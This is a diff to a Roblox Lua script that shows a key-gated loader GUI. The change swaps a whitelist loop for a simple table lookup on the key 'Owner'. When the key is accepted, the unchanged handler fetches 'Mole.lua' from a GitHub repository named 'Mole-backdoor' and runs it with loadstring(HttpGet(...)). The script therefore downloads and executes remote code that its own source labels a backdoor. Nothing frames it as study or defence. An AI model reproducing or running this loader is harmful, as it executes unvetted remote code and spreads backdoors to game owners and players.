@@ -1,7 +1,5 @@
 local whitelisted = {
-    Ughuhh09 = {
-        Key = "Owner"
-    }
+    Owner = true
 }
 
 local gui = Instance.new("ScreenGui")
@@ -40,16 +38,7 @@ btn.Parent = frame
 
 btn.MouseButton1Click:Connect(function()
     local input = box.Text
-    local isValid = false
-
-    for _, userEntry in pairs(whitelisted) do
-        if input == userEntry.Key then
-            isValid = true
-            break
-        end
-    end
-
-    if isValid then
+    if whitelisted[input] then
         gui:Destroy()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Mole-backdoor/refs/heads/main/Mole.lua"))()
     else
